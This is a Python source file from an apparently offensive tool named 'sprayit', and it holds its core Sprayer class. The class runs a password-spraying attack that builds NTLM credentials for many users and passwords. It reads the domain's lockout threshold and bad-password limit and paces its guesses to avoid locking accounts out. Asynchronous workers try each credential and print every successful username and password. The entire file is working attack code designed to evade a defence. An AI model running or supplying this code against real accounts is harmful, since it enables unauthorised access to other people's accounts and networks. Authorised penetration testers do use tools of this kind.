import asyncio
import datetime

from sprayit import logger

class SprayitProgress:
	def __init__(self, domain, username, password, error, total, current):
		self.username = username
		self.password = password
		self.error = error
		self.total = total
		self.current = current


class Sprayer:
	def __init__(self, module, target, max_bad_password_cnt = 5, lockout_treshold = 30 ,users_from_module = False, domain = None, worker_cnt = 4, progress_queue = None):
		self.module = module
		self.domain = domain
		self.target = target
		self.progress_queue = progress_queue
		self.worker_cnt = worker_cnt
		self.user_gens = []
		self.password_gens = []
		self.lockout_treshold = lockout_treshold
		self.max_bad_password_cnt = max_bad_password_cnt
		self.users_from_module = users_from_module

		self.users_progress = {} #userid -> credential
		self.users_table = {} #user id -> last bad password
		self.finished_users = {} #user id -> password

		self.users = {}
		self.passwords = []
		self.workers = []
		self.in_q = None
		self.out_q = None
		self.spray_task = None
		self.target_gen_finished_evt = None
		self.finished_evt = None
		self.workers_finished_cnt = 0
		self.total = 0 
		self.current = 0

	async def __worker(self):
		try:
			while True:
				res = await self.in_q.get()
				if res is None:
					return
				uid, target, cred = res

				cres, err = await self.module.try_credential(target, cred)
				if err is not None:
					await self.out_q.put((uid, self.module.get_password_from_cred(cred), err))
				else:
					await self.out_q.put((uid, self.module.get_password_from_cred(cred), None))
					

		except Exception as e:
			logger.debug('Worker died! Reason: %s' % e)
		finally:
			self.workers_finished_cnt += 1

	async def __spray(self):
		try:
			domain = self.domain
			for uid in self.users:
				username = self.users[uid]
				if username.find('\\') != -1:
					domain, username = username.split('\\', 1)
				if uid not in self.users_progress:
					self.users_progress[uid] = []
				for _, password in self.passwords:
					self.total += 1
					self.users_progress[uid].append(self.module.build_auth_template(domain, username, password, auth_protocol = 'ntlm'))

			to_delete = []
			for uid in self.users_progress:
				creds = []
				for _ in range(self.max_bad_password_cnt - 2):
					if self.users_progress[uid]:
						creds.append(self.users_progress[uid].pop())
					else:
						to_delete.append(uid)
						break
				
				for cred in creds:
					await self.in_q.put((uid, self.target, cred))
				
				self.users_table[uid] = datetime.datetime.utcnow() 
			
			for uid in to_delete:
				del self.users_progress[uid]
			
			while True:
				if len(self.users_progress) == 0:
					break

				for uid in self.finished_users:
					if uid in self.users_table:
						del self.users_table[uid]
					
					if uid in self.users_progress:
						del self.users_progress[uid]
				
				to_check = []
				for uid in self.users_table:
					if (datetime.datetime.utcnow() - self.users_table[uid]).total_seconds() <  self.lockout_treshold:
						continue
					to_check.append(uid)
				
				if len(to_check) > 0:
				
					if uid in to_check:
						creds = []
						for _ in range(self.max_bad_password_cnt - 2):
							if self.users_progress[uid]:
								creds.append(self.users_progress[uid].pop())
							else:
								del self.users_progress[uid]
								break

						for cred in creds:
							await self.in_q.put((uid, self.target, cred))

				await asyncio.sleep(5)
			
			for _ in range(len(self.workers)):
				await self.in_q.put(None)
			
			self.target_gen_finished_evt.set()

		except Exception as e:
			logger.exception('__spray error!')

	async def check_finished(self):
		while True:
			await asyncio.sleep(1)
			if self.target_gen_finished_evt.is_set():
				if self.worker_cnt == self.workers_finished_cnt:
					if self.out_q.empty() is True:
						self.finished_evt.set()
						return True

	async def run(self):
		try:
			for target_gen in self.user_gens:
				async for uid, target, err in target_gen.get_all():
					if err is not None:
						raise err
					self.users[uid] = target
			
			for target_gen in self.password_gens:
				async for uid, target, err in target_gen.get_all():
					if err is not None:
						raise err
					self.passwords.append((uid, target))

			_, err = await self.module.setup()
			if err is not None:
				raise err

			self.lockout_treshold, err = await self.module.get_lockout_treshold()
			if err is not None:
				raise err
			self.max_bad_password_cnt, err = await self.module.get_badpassword_max()
			if err is not None:
				raise err

			if self.users_from_module is True:
				async for uid, users, err in self.module.get_users():
					if err is not None:
						raise err
					self.users[uid] = users

			self.in_q = asyncio.Queue(self.worker_cnt)
			self.out_q = asyncio.Queue()
			self.finished_evt = asyncio.Event()
			self.target_gen_finished_evt = asyncio.Event()

			self.spray_task = asyncio.create_task(self.__spray())
			for _ in range(self.worker_cnt):
				self.workers.append(asyncio.create_task(self.__worker()))

			
			while not self.finished_evt.is_set():
				waiters = [self.out_q.get(), self.check_finished()]
				for res in asyncio.as_completed(waiters):
					res = await res
					if res is True:
						break

					self.current += 1
					userid, password, error = res
					if self.progress_queue:
						prog = SprayitProgress(self.domain, self.users[userid], password, error, self.total, self.current)
						await self.progress_queue.put(prog)

					if error is None:
						self.finished_users[userid] = password
						if self.progress_queue is None:
							print('[+] %s : %s' % (self.users[userid], self.finished_users[userid]))
						break
					else:
						if error == 'CONNECTIONERR':
							raise Exception('Server connection error!')
						elif error == 'CREDENTIALERR':
							logger.debug('[-] Cred not good! %s : %s' % (self.users[userid], password))
							break
						else:
							raise Exception('Unknown error! %s' % error)
				
			for worker in self.workers:
				worker.cancel()

			return True, None
		except Exception as e:
			logger.exception('sprayit.run error!')
			return [], e




